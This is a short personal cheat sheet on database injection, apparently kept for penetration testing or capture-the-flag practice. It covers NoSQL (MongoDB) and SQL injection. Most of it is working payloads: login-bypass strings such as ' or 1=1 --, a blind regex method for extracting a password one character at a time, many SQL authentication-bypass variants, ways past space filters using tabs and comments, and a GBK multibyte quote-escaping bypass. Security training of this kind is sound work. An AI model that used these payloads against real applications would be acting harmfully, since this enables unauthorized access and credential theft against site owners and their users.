# DB Injections

## References

- [NodeJS and Mongo](https://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb.html)
- [NoSQL Injection Primer](https://nullsweep.com/a-nosql-injection-primer-with-mongo/)
- [SQL Injection Cheat Sheet](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
- [SQL Injection](https://www.hacksplaining.com/prevention/sql-injection)
- [SQL Acunetix Example](https://www.acunetix.com/blog/articles/exploiting-sql-injection-example)

## Mongo DB Injection

Need two things to bypass this login for:

> - An always true condition. (' or 1=1 --)
> - A way to correctly terminate the NoSQL query.
> - Attack the username, not a passsword

```
http://url/?username=test' || 1==1 %00&submit=Submit&password=test
```

Notes:

- In some cases, You can also use the comments // or <!-- to comment out the end of the query.

http://url/?search=admin%27%20%26%26%20this.password.match(/^a.*$/)%00

We can play around to confirm that guess:

```
if we access /?search=admin'%20%26%26%20this.password.match(/.*/)%00: we can see a result.
if we access /?search=admin'%20%26%26%20this.password.match(/zzzzz/)%00: we cannot see a result.
if we access /?search=admin'%20%26%26%20this.passwordzz.match(/.*/)%00: we get an error message (since the field passwordzz does not exist).
```
Now, we have a way to perform a blind injection since we have two states:

No result when the regular expression does not match something: false state.
One result when the regular expression matches something: true state.

example password `bb3`
```
/^b.*$/ that will return true.
/^b$/ that will return false.
/^bb.*$/ that will return true.
/^bb$/ that will return false.
/^bbb.*$/ that will return false.
/^bb3.*$/ that will return true.
/^bb3$/ that will return true. The password has been found.
```

## SQL injections

There are three different ways to echo information in a SQL statement:

- Using quotes: single quote or double quote.
- Using back-ticks.
- Directly.

Inject a condition that is always true: 1=1. To do that, we are going to:

- Break outside of the single quote to be able to inject SQL using a single quote.
- Add a OR keyword to make sure the comparison is always true.
- Add always true comparison: 1=1
- Comment out the remaining query using -- (the space at the end matters) or #

Exploitation
```
username=test' or 1=1 #
username=test' or 1=1 --
username=test' or '1'='1' -- '
username=test'%09or%09'1'='1'%09--%09' # Encode Spaces
username=test'or'1'='1'--' # Spaces not required
username=admin" or 1=1 --
username=admin"or1=1#
username=admin" or "1"="1 --
username=admin" or "1"="1" -- "
admin' or '1'='1' LIMIT 1 -- '
password=") or 1=1 --
password=") or ("1"="1
```

## No Space protection

The error message gives away the protection created by the developer: NO SPACE. This error message appears as soon as a space is injected inside the request. It prevents us from using the ' or '1'='1 method, or any fingerprinting that uses the space character. However, this filtering is easily bypassed, using tabulation (HT or \t).

Developer blocks spaces and tabulations:
- don't need spaces between the keywords in your injection.
- can use `#` instead of `--` (if necessary).

## GBK Chinese Escaping

Create a single quite on Chineese that not escaped properly
```
username=admin%bf%27+or+1=1+--+
```

